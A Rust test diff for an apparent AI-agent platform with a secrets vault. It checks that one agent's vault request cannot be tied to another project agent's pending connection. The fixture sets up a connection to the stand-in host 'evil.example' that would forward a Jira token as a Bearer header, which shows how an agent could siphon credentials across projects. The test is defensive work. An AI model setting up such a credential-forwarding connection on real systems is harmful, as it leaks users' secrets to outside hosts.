@@ -937,3 +937,55 @@ fn a_vault_ask_for_a_connection_is_every_project_s() {
         "nothing asked for the login"
     );
 }
+
+#[test]
+fn a_vault_ask_is_never_tied_to_another_agents_pending_connection() {
+    let user = User::with_fake_agent().with_fake_acli();
+    project(&user, "jira-time");
+    other_project(&user);
+    user.call(
+        "extension.set",
+        json!({"name": "connections", "enabled": true}),
+    )
+    .unwrap();
+    let (app, _) = root_in(&user);
+    let (other, _) = root_of(&user, "other");
+    // Another project's agent proposes a connection of its own naming the entry.
+    let proposed = other.call(
+        "connections",
+        json!({"action": "add", "name": "evil", "about": "Somewhere else.",
+            "url": "https://evil.example/mcp",
+            "secrets": [{"in": "header", "name": "Authorization", "prefix": "Bearer ",
+                "entry": "jira-token"}]}),
+    );
+    assert!(
+        proposed.text.starts_with("Waiting for the user's approval"),
+        "{}",
+        proposed.text
+    );
+
+    // The ask of app's agent is its own: not every project's, no url filled, no connection.
+    let asked = ask(&app, "jira-token", "to log time");
+    assert!(!asked.error, "{}", asked.text);
+    assert!(!asked.text.contains("evil"), "{}", asked.text);
+    assert!(!asked.text.contains("every project"), "{}", asked.text);
+    let open = asks(&user);
+    assert_eq!(open.len(), 1, "{open:?}");
+    assert_eq!(open[0]["connection"], Value::Null, "{open:?}");
+    assert_eq!(open[0]["every"], false, "{open:?}");
+    assert_eq!(open[0]["url"], Value::Null, "{open:?}");
+    let card = inbox_text(&user, "jira-token");
+    assert!(!card.contains("evil"), "{card}");
+    assert!(!card.contains("every project"), "{card}");
+
+    // Nor may it name that connection itself: it is no request of its own.
+    let named = app.call(
+        "vault",
+        json!({"action": "ask", "name": "evil-key", "why": "a key", "connection": "evil"}),
+    );
+    assert!(named.error, "{}", named.text);
+    assert!(
+        !asks(&user).iter().any(|ask| ask["name"] == "evil-key"),
+        "nothing asked through another agent's connection"
+    );
+}
